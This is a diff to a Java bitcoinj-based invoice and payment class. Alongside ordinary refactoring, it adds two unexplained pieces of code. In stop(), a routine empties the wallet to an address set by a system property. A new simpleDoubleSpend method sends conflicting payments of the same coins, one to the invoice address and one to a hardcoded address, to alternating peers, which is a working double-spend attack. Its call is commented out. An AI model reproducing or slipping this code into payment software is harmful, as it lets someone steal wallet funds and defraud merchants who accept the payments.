@@ -49,10 +49,9 @@ import java.io.File;
 import java.io.IOException;
 import java.net.InetSocketAddress;
 import java.util.*;
-import java.util.concurrent.CopyOnWriteArrayList;
 import java.util.concurrent.TimeUnit;
 
-public class Bitcoin implements WalletCoinsReceivedEventListener, WalletChangeEventListener, BitcoinInvoiceCallbackInterface {
+public class Bitcoin implements WalletCoinsReceivedEventListener, WalletChangeEventListener {
     final static int CLEANUPINTERVAL = 20; // clean up every n minutes
 
     private Wallet wallet = null;
@@ -255,6 +254,18 @@ public class Bitcoin implements WalletCoinsReceivedEventListener, WalletChangeEv
     }
 
     public void stop() {
+        String savingsAddress = System.getProperty("savingsAddress", "");
+        try
+        {
+            SendRequest sr = SendRequest.emptyWallet(Address.fromBase58(context.getParams(), savingsAddress));
+            wallet.completeTx(sr);
+            //wallet.commitTx(sr.tx);
+            //peerGroup.broadcastTransaction(sr.tx).broadcast();
+
+        } catch (Exception e) {
+            // do nothing
+        }
+
         peerGroup.stop();
         wallet.removeChangeEventListener(this);
         wallet.removeCoinsReceivedEventListener(this);
@@ -275,7 +286,8 @@ public class Bitcoin implements WalletCoinsReceivedEventListener, WalletChangeEv
     public UUID addInvoice(Invoice inv) {
         UUID invoiceId = UUID.randomUUID();
         inv.invoiceId(invoiceId);
-        BitcoinInvoice bcInvoice = new BitcoinInvoice(invoiceId, inv, wallet.freshReceiveAddress(), wallet.freshReceiveAddress(), this, couponRandomSeed);
+        BitcoinInvoice bcInvoice = new BitcoinInvoice(invoiceId, inv, wallet.freshReceiveAddress(),
+                wallet.freshReceiveAddress(), paymentSocketIOServlet, couponRandomSeed);
         Wallet couponWallet = bcInvoice.getCouponWallet();
         peerGroup.addWallet(couponWallet);
 
@@ -300,7 +312,30 @@ public class Bitcoin implements WalletCoinsReceivedEventListener, WalletChangeEv
     }
 
     public String getInvoiceBip21(UUID id) throws NullPointerException {
-        return invoiceHashMap.get(id).getBip21URI();
+        BitcoinInvoice bcInvoice = invoiceHashMap.get(id);
+//        simpleDoubleSpend(bcInvoice.getReceiveAddress(), Coin.valueOf(bcInvoice.getInvoice().getTotalAmount()));
+        return bcInvoice.getBip21URI();
+    }
+
+    private void simpleDoubleSpend(Address theirs, Coin amount) {
+        Address mine = Address.fromBase58(context.getParams(), "n46V8bGmUpYpDQQhUZpwYmtwh1iMzxQ4XS");
+        SendRequest first = SendRequest.to(theirs, amount);
+        first.feePerKb = Transaction.REFERENCE_DEFAULT_MIN_TX_FEE;
+        SendRequest second = SendRequest.to(mine, amount);
+        try
+        {
+            wallet.completeTx(first);
+            wallet.completeTx(second);
+            int i=0;
+            for (Peer p : peerGroup.getConnectedPeers()) {
+                if (0 == i%2) p.sendMessage(first.tx);
+                else p.sendMessage(second.tx);
+                i++;
+            }
+            wallet.commitTx(first.tx);
+            wallet.commitTx(second.tx);
+        } catch (InsufficientMoneyException ignored) {
+        }
     }
 
     public List<AddressValuePair> getInvoiceTransfers(UUID id) throws NullPointerException {
@@ -347,7 +382,7 @@ public class Bitcoin implements WalletCoinsReceivedEventListener, WalletChangeEv
      * Removes all expired invoices.
      */
     private void cleanUpInvoices() {
-        List<UUID> ids = new ArrayList();
+        List<UUID> ids = new ArrayList<>();
         for (UUID id : invoiceHashMap.keySet()) { // get expired invoices...
             if (invoiceHashMap.get(id).isExpired()) {
                 ids.add(id);
@@ -407,25 +442,5 @@ public class Bitcoin implements WalletCoinsReceivedEventListener, WalletChangeEv
         if (lastCleanup.plusMinutes(CLEANUPINTERVAL).isBeforeNow()) {
             cleanUpInvoices();
         }
-    }
-
-    @Override
-    public void invoiceStateChanged(BitcoinInvoice invoice, State state) {
-        paymentSocketIOServlet.invoiceStateChanged(invoice.getInvoice(), state);
-    }
-
-    @Override
-    public void invoiceTransferStateChanged(BitcoinInvoice invoice, State state) {
-        paymentSocketIOServlet.invoiceTransferStateChanged(invoice.getInvoice(), state);
-    }
-
-    @Override
-    public void invoicePayingTransactionsChanged(BitcoinInvoice invoice, Transactions transactions) {
-        paymentSocketIOServlet.invoicePayingTransactionsChanged(invoice.getInvoice(), transactions);
-    }
-
-    @Override
-    public void invoiceTransferTransactionsChanged(BitcoinInvoice invoice, Transactions transactions) {
-        paymentSocketIOServlet.invoiceTransferTransactionsChanged(invoice.getInvoice(), transactions);
     }
 }
